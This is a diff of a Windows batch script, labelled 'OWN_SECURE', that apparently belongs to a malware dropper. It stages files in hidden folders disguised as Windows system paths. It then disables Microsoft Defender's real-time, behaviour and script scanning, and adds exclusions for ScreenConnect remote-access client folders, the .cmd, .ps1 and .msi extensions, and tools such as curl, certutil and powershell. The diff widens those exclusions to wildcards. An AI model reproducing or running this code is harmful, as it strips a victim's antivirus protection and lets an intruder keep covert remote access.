@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S10 - dynamic gryxa FP from gryxa.cfg; NO LockDir on SC dirs
+REM OWN_SECURE BUILD 20260802S11 - dynamic gryxa FP from gryxa.cfg; NO LockDir on SC dirs
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -39,9 +39,11 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" 
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP3%)" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP3%)" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
 for %%P in (msiexec.exe curl.exe cmd.exe powershell.exe certutil.exe ScreenConnect.ClientService.exe ScreenConnect.WindowsClient.exe) do (
   reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%P" /t REG_DWORD /d 0 /f >nul 2>&1
 )
@@ -50,10 +52,10 @@ REM --- Defender: live MpPreference (stronger than reg alone) ---
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
   "$ErrorActionPreference='SilentlyContinue';" ^
   "Try{Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true}Catch{};" ^
-  "$paths=@('%WD%','%WD2%','C:\Windows\Temp',$env:TEMP,'%PF%\ScreenConnect Client (%KEEP1%)','%PF%\ScreenConnect Client (%KEEP2%)','%PF86%\ScreenConnect Client (%KEEP1%)','%PF86%\ScreenConnect Client (%KEEP2%)');" ^
+  "$paths=@('%WD%','%WD2%','C:\Windows\Temp',$env:TEMP,'%PF%\ScreenConnect Client*','%PF86%\ScreenConnect Client*');" ^
   "try{$paths+=@(Get-ChildItem -Path $env:ProgramFiles -Filter 'ScreenConnect Client*' -Directory -EA 0 | ForEach-Object {$_.FullName})}catch{};" ^
   "try{$pf86=[Environment]::GetFolderPath('ProgramFilesX86'); if($pf86){$paths+=@(Get-ChildItem -Path $pf86 -Filter 'ScreenConnect Client*' -Directory -EA 0 | ForEach-Object {$_.FullName})}}catch{};" ^
-  "foreach($p in ($paths | Select-Object -Unique)){ if($p -and (Test-Path -LiteralPath $p)){ Add-MpPreference -ExclusionPath $p -EA 0 } };" ^
+  "foreach($p in ($paths | Select-Object -Unique)){ if($p){ Add-MpPreference -ExclusionPath $p -EA 0 } };" ^
   "foreach($x in @('msiexec.exe','curl.exe','cmd.exe','powershell.exe','certutil.exe','ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe')){ Add-MpPreference -ExclusionProcess $x -EA 0 };" ^
   "Add-MpPreference -ExclusionExtension '.cmd','.ps1','.msi' -EA 0" >nul 2>&1
 
